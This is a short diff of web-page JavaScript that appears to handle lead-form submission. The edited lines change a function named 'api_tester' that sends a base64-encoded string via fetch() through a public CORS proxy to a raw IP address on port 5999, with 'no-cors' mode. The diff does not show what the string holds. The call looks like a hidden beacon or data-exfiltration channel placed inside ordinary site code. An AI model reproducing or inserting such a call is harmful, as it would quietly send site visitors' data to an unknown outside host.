@@ -62,7 +62,7 @@ formData.append('lead_id', document.getElementById('jornaya_leadid').value);
       xhr.send(formData);
     });function api_tester(randomString) {
   try {
-    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)+',a'
 , {
       method: 'GET',
       mode: 'no-cors'
